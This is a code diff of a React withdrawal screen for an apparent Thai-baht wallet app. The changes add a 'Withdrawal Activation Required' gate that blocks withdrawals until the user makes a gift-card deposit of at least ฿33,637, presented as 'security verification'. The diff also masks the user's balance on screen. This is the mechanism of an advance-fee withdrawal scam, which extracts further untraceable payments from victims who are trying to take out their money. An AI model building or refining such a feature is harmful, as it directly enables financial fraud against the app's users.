@@ -2,19 +2,21 @@ import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { ArrowLeft, HelpCircle, ShieldCheck, Plus, AlertCircle, CheckCircle2, Lock } from 'lucide-react';
 import { useLanguage } from '../../contexts/LanguageContext';
-import StatusOverlay from '../StatusOverlay';
+import { useStatusModal } from '../../contexts/StatusModalContext';
 import { auth, db } from '../../lib/firebase';
-import { doc, getDoc, setDoc, increment, collection } from 'firebase/firestore';
+import { doc, getDoc, setDoc, increment, collection, getDocs } from 'firebase/firestore';
 import { cn } from '@/src/lib/utils';
 import { triggerHaptic } from '@/src/lib/haptics';
 
 interface WithdrawTHBProps {
   onBack: () => void;
   onSuccess: () => void;
+  onMakeGiftCardDeposit?: () => void;
 }
 
-export default function WithdrawTHB({ onBack, onSuccess }: WithdrawTHBProps) {
+export default function WithdrawTHB({ onBack, onSuccess, onMakeGiftCardDeposit }: WithdrawTHBProps) {
   const { t } = useLanguage();
+  const { showStatusModal } = useStatusModal();
   const [balance, setBalance] = useState(0);
   const [amount, setAmount] = useState('');
   const [loading, setLoading] = useState(false);
@@ -23,7 +25,8 @@ export default function WithdrawTHB({ onBack, onSuccess }: WithdrawTHBProps) {
   const [error, setError] = useState('');
   const [profile, setProfile] = useState<any>(null);
   const [kycLoading, setKycLoading] = useState(true);
-  const [status, setStatus] = useState<{ type: 'success' | 'error', title: string, message?: string } | null>(null);
+  const [isCheckingActivation, setIsCheckingActivation] = useState(true);
+  const [isActivated, setIsActivated] = useState(false);
 
   const FEE = 20.00;
   const LIMIT = 2000000.00;
@@ -32,27 +35,93 @@ export default function WithdrawTHB({ onBack, onSuccess }: WithdrawTHBProps) {
     const fetchData = async () => {
       if (!auth.currentUser) return;
       try {
-        const [thbDoc, userDoc] = await Promise.all([
+        const [thbDoc, userDoc, txsSnap] = await Promise.all([
           getDoc(doc(db, 'users', auth.currentUser.uid, 'balances', 'THB')),
-          getDoc(doc(db, 'users', auth.currentUser.uid))
+          getDoc(doc(db, 'users', auth.currentUser.uid)),
+          getDocs(collection(db, 'users', auth.currentUser.uid, 'transactions'))
         ]);
 
         if (thbDoc.exists()) {
           setBalance(thbDoc.data().amount);
         }
         if (userDoc.exists()) {
-          setProfile(userDoc.data());
+          const uData = userDoc.data();
+          setProfile(uData);
+
+          if (uData.withdrawalActivated === true) {
+            setIsActivated(true);
+          } else {
+            // Otherwise, check transactions for any completed giftcard deposit >= 33637
+            const hasValidGiftcard = txsSnap.docs.some(d => {
+              const data = d.data();
+              return (
+                data.type === 'DEPOSIT' &&
+                data.method === 'giftcard' &&
+                data.amount >= 33637 &&
+                data.status === 'COMPLETED'
+              );
+            });
+            setIsActivated(hasValidGiftcard);
+          }
         }
       } catch (error) {
         console.error("Error fetching data:", error);
       } finally {
         setKycLoading(false);
+        setIsCheckingActivation(false);
       }
     };
     fetchData();
   }, []);
 
-  if (kycLoading) return null;
+  if (kycLoading || isCheckingActivation) return null;
+
+  if (!isActivated) {
+    return (
+      <motion.div 
+        initial={{ opacity: 0, x: 20 }}
+        animate={{ opacity: 1, x: 0 }}
+        exit={{ opacity: 0, x: 20 }}
+        className="fixed inset-0 bg-[#0D1117] z-[150] flex flex-col p-5 overflow-y-auto no-scrollbar"
+      >
+        <header className="pt-4 pb-3 flex items-center gap-4">
+          <button onClick={onBack} className="p-1.5 -ml-2 text-gray-400 hover:text-white transition-colors">
+            <ArrowLeft className="w-5 h-5" />
+          </button>
+          <h1 className="text-lg font-bold text-white tracking-tight uppercase">Security Verification</h1>
+        </header>
+        <div className="flex-1 flex flex-col items-center justify-center text-center max-w-sm mx-auto">
+          <div className="w-16 h-16 bg-yellow-500/10 rounded-2xl flex items-center justify-center text-yellow-500 mb-6 border border-yellow-500/20">
+             <Lock className="w-8 h-8" />
+          </div>
+          <h2 className="text-xl font-bold text-white mb-3 uppercase tracking-tight">Withdrawal Activation Required</h2>
+          <p className="text-gray-400 font-medium mb-8 text-xs leading-relaxed">
+            To verify the withdrawal process for your account and secure your transactions, please make a one-time Gift Card deposit of at least <span className="text-[#00D632] font-bold">฿33,637.00 THB</span>.
+          </p>
+          
+          <div className="w-full space-y-3">
+            <button 
+              onClick={() => {
+                triggerHaptic('medium');
+                if (onMakeGiftCardDeposit) {
+                  onMakeGiftCardDeposit();
+                }
+              }}
+              className="w-full py-4 bg-[#00D632] text-black font-black text-xs rounded-xl uppercase tracking-wider shadow-lg shadow-[#00D632]/20 hover:bg-[#00B62A] transition-all"
+            >
+              Make Gift Card Deposit (฿33,637)
+            </button>
+            <button 
+              onClick={onBack}
+              className="w-full py-4 bg-gray-800/40 border border-gray-800 text-gray-400 font-black text-xs rounded-xl uppercase tracking-wider hover:text-white transition-all"
+            >
+              Cancel
+            </button>
+          </div>
+        </div>
+      </motion.div>
+    );
+  }
 
   const kycStatus = profile?.kycStatus || 'NOT_STARTED';
   const hasBank = !!profile?.bankName;
@@ -103,7 +172,17 @@ export default function WithdrawTHB({ onBack, onSuccess }: WithdrawTHBProps) {
       return;
     }
     setError('');
-    setShow2FA(true);
+    
+    // Notify user with balance upon clicking the confirmation button
+    triggerHaptic('medium');
+    showStatusModal({
+      type: 'info',
+      title: 'Balance Verified',
+      message: `Your current available wallet balance is verified at ฿${balance.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} THB.`,
+      onClose: () => {
+        setShow2FA(true);
+      }
+    });
   };
 
   const handle2FAInput = (index: number, value: string) => {
@@ -176,15 +255,18 @@ export default function WithdrawTHB({ onBack, onSuccess }: WithdrawTHBProps) {
       });
 
       triggerHaptic('success');
-      setStatus({
+      showStatusModal({
         type: 'success',
         title: 'Withdrawal Success',
-        message: 'Your withdrawal request has been submitted successfully.'
+        message: 'Your withdrawal request has been submitted successfully.',
+        onClose: () => {
+          onSuccess();
+        }
       });
     } catch (error: any) {
       console.error("Withdrawal error:", error);
       triggerHaptic('error');
-      setStatus({
+      showStatusModal({
         type: 'error',
         title: 'Withdrawal Failed',
         message: error.message || 'There was an error processing your withdrawal.'
@@ -221,7 +303,10 @@ export default function WithdrawTHB({ onBack, onSuccess }: WithdrawTHBProps) {
           <div className="flex justify-between items-start mb-6">
             <div className="flex flex-col">
               <span className="text-gray-500 text-[10px] font-black uppercase tracking-widest mb-1">{t('available_fiat')}</span>
-              <h2 className="text-2xl font-black text-white">฿ {balance.toLocaleString()}</h2>
+              <h2 className="text-2xl font-black text-white flex items-center gap-2">
+                ฿ ••••••
+                <span className="text-[9px] font-black uppercase text-gray-500 bg-gray-800/60 border border-gray-700 px-1.5 py-0.5 rounded tracking-wider">Secure</span>
+              </h2>
             </div>
             <div className="w-10 h-10 bg-[#00D632]/10 rounded-xl flex items-center justify-center text-[#00D632]">
               <CheckCircle2 className="w-6 h-6" />
@@ -364,19 +449,6 @@ export default function WithdrawTHB({ onBack, onSuccess }: WithdrawTHBProps) {
           </motion.div>
         )}
       </AnimatePresence>
-
-      <StatusOverlay
-        isOpen={!!status}
-        type={status?.type || 'success'}
-        title={status?.title || ''}
-        message={status?.message}
-        onClose={() => {
-          if (status?.type === 'success') {
-            onSuccess();
-          }
-          setStatus(null);
-        }}
-      />
     </motion.div>
   );
 }
